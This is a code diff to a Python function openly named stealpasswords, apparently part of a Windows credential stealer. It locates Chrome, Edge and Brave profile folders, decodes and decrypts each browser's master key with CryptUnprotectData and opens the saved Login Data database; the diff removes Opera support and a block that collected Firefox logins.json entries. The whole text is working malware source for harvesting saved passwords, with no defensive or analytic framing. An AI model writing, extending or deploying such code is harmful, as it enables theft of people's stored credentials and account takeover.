@@ -4,8 +4,7 @@ def stealpasswords():
     browsers = [
         ("Chrome", os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')),
         ("Edge", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data')),
-        ("Brave", os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data')),
-        ("Opera", os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable'))
+        ("Brave", os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data'))
     ]
     
     for browser_name, data_path in browsers:
@@ -17,9 +16,9 @@ def stealpasswords():
             with open(local_state, 'r', encoding='utf-8') as f:
                 local_data = json.load(f)
             
-            encrypted_key = base64.b64decode(local_data['os_crypt']['encrypted_key'])
-            encrypted_key = encrypted_key[5:]
-            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            key = base64.b64decode(local_data['os_crypt']['encrypted_key'])
+            key = key[5:]
+            key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
             
             login_db = os.path.join(data_path, 'Default', 'Login Data')
             if not os.path.exists(login_db):
@@ -57,25 +56,5 @@ def stealpasswords():
                 
         except:
             continue
-    
-    firefox_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
-    if os.path.exists(firefox_path):
-        for profile in os.listdir(firefox_path):
-            if '.default' in profile:
-                try:
-                    firefox_db = os.path.join(firefox_path, profile, 'logins.json')
-                    if os.path.exists(firefox_db):
-                        with open(firefox_db, 'r', encoding='utf-8') as f:
-                            firefox_data = json.load(f)
-                        
-                        for login in firefox_data.get('logins', []):
-                            passwords.append({
-                                'browser': 'Firefox',
-                                'url': login.get('hostname', ''),
-                                'username': login.get('encryptedUsername', ''),
-                                'password': login.get('encryptedPassword', '')
-                            })
-                except:
-                    continue
     
     return passwords
